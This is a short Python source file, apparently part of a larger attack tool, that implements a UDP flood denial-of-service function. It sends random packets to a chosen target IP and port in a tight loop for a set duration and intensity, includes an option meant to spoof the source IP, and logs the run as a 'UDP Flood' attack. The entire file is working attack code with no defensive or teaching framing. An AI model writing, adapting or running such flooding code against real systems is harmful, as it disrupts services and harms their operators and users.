import socket
import random
import time
from app.logger import log_attack

def attack(target_ip, target_port, duration, intensity, packet_size=1024, headers=None, spoof_ip=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    start_time = time.time()
    packet_count = 0

    while time.time() - start_time < duration:
        for _ in range(intensity):
            packet = random._urandom(packet_size)
            if spoof_ip:
                sock.bind((spoof_ip, 0))

            sock.sendto(packet, (target_ip, target_port))
            packet_count += 1
            # print(f"Sent UDP packet #{packet_count} to {target_ip}:{target_port}")

    log_attack("UDP Flood", target_ip, target_port, duration, intensity)
    # print(f"UDP Flood attack completed. Total packets sent: {packet_count}")

